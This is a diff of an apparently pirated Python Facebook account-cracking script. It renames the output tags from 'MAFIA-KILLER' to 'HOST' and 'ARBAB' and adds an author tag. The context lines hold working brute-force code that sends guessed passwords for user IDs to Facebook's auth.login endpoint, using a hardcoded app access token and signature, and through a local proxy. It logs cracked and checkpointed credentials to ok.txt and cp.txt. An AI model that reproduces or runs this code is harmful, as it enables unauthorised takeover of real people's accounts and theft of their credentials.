@@ -323,14 +323,14 @@ def b_menu_select():
 		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		    d=json.loads(q)
 		    if 'www.facebook.com' in d['error_msg']:
-		        print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass1)
+		        print("\033[1;31m[HOST-CP] "+uid+" | "+pass1)
 		        cp=open("cp.txt","a")
 		        cp.write(uid+" | "+pass1+"\n")
 		        cp.close()
 		        cps.append(uid)
 		    else:
 		    	if "access_token" in d:
-		            print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
+		            print("\033[1;32m[HOST-OK] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
 		            ok=open("ok.txt","a")
 		            ok.write(uid+" | "+pass1+"\n")
 		            ok.close()
@@ -340,14 +340,14 @@ def b_menu_select():
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		            d=json.loads(q)
 		            if 'www.facebook.com' in d['error_msg']:
-		                print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass2)
+		                print("\033[1;31m[HOST-CP] "+uid+" | "+pass2)
 		                cp=open("cp.txt","a")
 		                cp.write(uid+" | "+pass2+"\n")
 		                cp.close()
 		                cps.append(uid)
 		            else:
 		                if 'access_token' in d:
-		                    print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
+		                    print("\033[1;32m[HOST-OK] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
 		                    ok=open("ok.txt","a")
 		                    ok.write(uid+" | "+pass2+"\n")
 		                    ok.close()
@@ -357,14 +357,14 @@ def b_menu_select():
 		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                    d=json.loads(q)
 		                    if 'www.facebook.com' in d['error_msg']:
-		                        print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass3)
+		                        print("\033[1;31m[HOST-CP] "+uid+" | "+pass3)
 		                        cp=open("cp.txt","a")
 		                        cp.write(uid+" | "+pass3+"\n")
 		                        cp.close()
 		                        cps.append(uid)
 		                    else:
 		                        if 'access_token' in d:
-		                            print(" \033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
+		                            print(" \033[1;32m[HOST-OK] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
 		                            ok=open("ok.txt","a")
 		                            ok.write(uid+" | "+pass3+"\n")
 		                            ok.close()
@@ -374,14 +374,14 @@ def b_menu_select():
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                            d=json.loads(q)
 		                            if 'www.facebook.com' in d['error_msg']:
-		                                print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass4)
+		                                print("\033[1;31m[HOST-CP] "+uid+" | "+pass4)
 		                                cp=open("cp.txt","a")
 		                                cp.write(uid+" | "+pass4+"\n")
 		                                cp.close()
 		                                cps.append(uid)
 		                            else:
 		                                if 'access_token' in d:
-		                                    print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
+		                                    print("\033[1;32m[HOST-OK] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
 		                                    ok=open("ok.txt","a")
 		                                    ok.write(uid+" | "+pass4+"\n")
 		                                    ok.close()
@@ -391,14 +391,14 @@ def b_menu_select():
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
-		                                        print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass5)
+		                                        print("\033[1;31m[HOST-CP] "+uid+" | "+pass5)
 		                                        cp=open("cp.txt","a")
 		                                        cp.write(uid+" | "+pass5+"\n")
 		                                        cp.close()
 		                                        cps.append(uid)
 		                                    else:
 		                                        if 'access_token' in d:
-		                                            print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
+		                                            print("\033[1;32m[HOST-OK] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
 		                                            ok=open("ok.txt","a")
 		                                            ok.write(uid+" | "+pass5+"\n")
 		                                            ok.close()
@@ -408,14 +408,14 @@ def b_menu_select():
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                            d=json.loads(q)
 		                                            if 'www.facebook.com' in d['error_msg']:
-		                                                print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass6)
+		                                                print("\033[1;31m[HOST-CP] "+uid+" | "+pass6)
 		                                                cp=open("cp.txt","a")
 		                                                cp.write(uid+" | "+pass6+"\n")
 		                                                cp.close()
 		                                                cps.append(uid)
 		                                            else:
 		                                                if 'access_token' in d:
-		                                                    print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
+		                                                    print("\033[1;32m[HOST-OK] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
 		                                                    ok=open("ok.txt","a")
 		                                                    ok.write(uid+" | "+pass6+"\n")
 		                                                    ok.close()
@@ -425,14 +425,14 @@ def b_menu_select():
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                                    d=json.loads(q)
 		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass7)
+		                                                        print("\033[1;31m[HOST-CP] "+uid+" | "+pass7)
 		                                                        cp=open("cp.txt","a")
 		                                                        cp.write(uid+" | "+pass7+"\n")
 		                                                        cp.close()
 		                                                        cps.append(uid)
 		                                                    else:
 		                                                        if 'access_token' in d:
-		                                                            print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
+		                                                            print("\033[1;32m[HOST-OK] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
 		                                                            ok=open("ok.txt","a")
 		                                                            ok.write(uid+" | "+pass7+"\n")
 		                                                            ok.close()
@@ -777,14 +777,14 @@ def l_menu_select():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
+				print("\033[1;32m[ARBAB-OK] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt","a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error"]:
-					print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass1)
+					print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass1)
 					cp = open("cp.txt","a")
 					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
@@ -794,14 +794,14 @@ def l_menu_select():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
+						print("\033[1;32m[ARBAB-OK] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt","a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass2)
+							print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass2)
 							cp = open("cp.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
@@ -811,14 +811,14 @@ def l_menu_select():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
+								print("\033[1;32m[ARBAB-OK] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt","a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error"]:
-									print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass3)
+									print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass3)
 									cp = open("cp.txt","a")
 									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
@@ -828,14 +828,14 @@ def l_menu_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
+										print("\033[1;32m[ARBAB-OK] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt","a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error"]:
-											print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass4)
+											print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass4)
 											cp = open("cp.txt","a")
 											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
@@ -845,14 +845,14 @@ def l_menu_select():
 											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 											q = json.loads(data)
 											if "loc" in q:
-												print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
+												print("\033[1;32m[ARBAB-OK] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt","a")
 												ok.write(uid+" | "+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error"]:
-													print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass5)
+													print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass5)
 													cp = open("cp.txt","a")
 													cp.write(uid+" | "+pass5+"\n")
 													cp.close()
@@ -862,14 +862,14 @@ def l_menu_select():
 													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
 													q = json.loads(data)
 													if "loc" in q:
-														print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
+														print("\033[1;32m[ARBAB-OK] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt","a")
 														ok.write(uid+" | "+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error"]:
-															print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass6)
+															print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass6)
 															cp = open("cp.txt","a")
 															cp.write(uid+" | "+pass6+"\n")
 															cp.close()
@@ -879,14 +879,14 @@ def l_menu_select():
 															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
 															q = json.loads(data)
 															if "loc" in q:
-																print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
+																print("\033[1;32m[ARBAB-OK] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt","a")
 																ok.write(uid+" | "+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in q["error"]:
-																	print("\033[1;31m[MAFIA-KILLER-CP] "+uid+" | "+pass7)
+																	print("\033[1;31m[ARBAB-CP] "+uid+" | "+pass7)
 																	cp = open("cp.txt","a")
 																	cp.write(uid+" | "+pass7+"\n")
 																	cp.close()
@@ -909,3 +909,4 @@ def l_menu_select():
 	l_menu()
 if __name__ == '__main__':
     method_menu()
+#####Arbab Memon
